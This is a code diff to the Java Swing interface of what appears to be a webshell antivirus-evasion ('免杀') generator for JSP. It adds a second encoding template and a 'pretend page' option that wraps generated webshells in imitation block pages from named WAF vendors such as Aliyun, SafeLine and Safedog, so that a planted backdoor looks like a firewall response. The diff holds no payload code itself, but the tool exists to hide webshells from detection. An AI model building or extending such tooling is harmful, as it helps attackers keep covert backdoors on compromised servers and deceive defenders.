@@ -1,6 +1,7 @@
 package application;
 
 import encode.*;
+import pretend.HtmlPretend;
 
 import javax.swing.*;
 import java.awt.*;
@@ -10,6 +11,8 @@ public class JspPanel {
     JPanel JspJPanel;
     JPanel selectJPanel;
     JComboBox status;
+    JComboBox pretend;
+    public static JTextField pretendJTextField;
     JTextField jTextField;
     JTextArea sourcecodeArea;
     JTextArea encodeArea;
@@ -27,6 +30,7 @@ public class JspPanel {
         status = new JComboBox();
         status.addItem("未选择");
         status.addItem("jsp_demo1");
+        status.addItem("jsp_demo2");
 
         status.addActionListener(new AbstractAction() {
             @Override
@@ -35,12 +39,15 @@ public class JspPanel {
                     case "jsp_demo1":
                         txtArea.setText(JspEncodeDemo1.GetDemotxt());
                         break;
+                    case "jsp_demo2":
+                        txtArea.setText(JspEncodeDemo2.GetDemotxt());
+                        break;
                     default:
                         encodeArea.setText("请选择jsp免杀模板");
                 }
             }
         });
-        jPanel1.add(new JLabel("选择免杀模板"));
+        jPanel1.add(new JLabel("免杀模板"));
         jPanel1.add(status);
 
         JPanel jPanel2 = new JPanel();
@@ -48,30 +55,61 @@ public class JspPanel {
         jPanel2.add(new JLabel("加密密钥"));
         jPanel2.add(jTextField);
 
-        JPanel jPanel3 = new JPanel();
+        JPanel pretendJPanel = new JPanel();
+        pretend = new JComboBox();
+        pretend.addItem("未选择");
+        pretend.addItem("AliyunWAF");
+        pretend.addItem("T-mshenWAF");
+        pretend.addItem("T-secWAF");
+        pretend.addItem("AnyuWAF");
+        pretend.addItem("SafeLineWAF");
+        pretend.addItem("SafedogWAF");
+        pretend.addItem("WangsuWAF");
+        pretend.addItem("custom");
+        pretendJTextField = new JTextField("Base64",5);
+        pretendJPanel.add(new JLabel("模拟页面"));
+        pretendJPanel.add(pretend);
+        pretendJPanel.add(pretendJTextField);
+
+        //JPanel jPanel3 = new JPanel();
         Button button = new Button("免杀");
         button.addActionListener(new AbstractAction() {
             @Override
             public void actionPerformed(ActionEvent e) {
+                String[] jspdemo =null;
                 switch ((String)status.getSelectedItem()) {
                     case "jsp_demo1":
-                        String jspdemo1= "";
                         try {
-                            jspdemo1 = new JspEncodeDemo1((String) status.getSelectedItem(), jTextField.getText(), sourcecodeArea.getText()).Run();
+                            jspdemo = new JspEncodeDemo1((String) status.getSelectedItem(), jTextField.getText(), sourcecodeArea.getText()).Run();
                         } catch (Exception ex) {
                             ex.printStackTrace();
                         }
-                        encodeArea.setText(jspdemo1);
+                        jspdemo[0] += new HtmlPretend().GetJsp7((String) pretend.getSelectedItem());
+                        break;
+                    case "jsp_demo2":
+                        try {
+                            jspdemo = new JspEncodeDemo2((String) status.getSelectedItem(), jTextField.getText(), sourcecodeArea.getText()).Run();
+                        } catch (Exception ex) {
+                            ex.printStackTrace();
+                        }
+                        jspdemo[0] += new HtmlPretend().GetJsp9((String) pretend.getSelectedItem());
                         break;
                     default:
-                        encodeArea.setText("请选择jsp免杀模板");
+                        jspdemo = new String[]{"请选择jsp免杀模板",""};
+                }
+
+                encodeArea.setText(jspdemo[0]);
+                if(pretend.getSelectedItem().equals("custom")&&pretendJTextField.getText().equals("Base64")){
+                    encodeArea.setText("请输入自定义页面Base64编码");
                 }
             }
         });
-        jPanel3.add(button);
+        //jPanel3.add(button);
+
         selectJPanel.add(jPanel1);
         selectJPanel.add(jPanel2);
-        selectJPanel.add(jPanel3);
+        selectJPanel.add(pretendJPanel);
+        selectJPanel.add(button);
 
         JPanel sourcecodeJpanel = new JPanel(new BorderLayout());
         sourcecodeArea = new JTextArea();
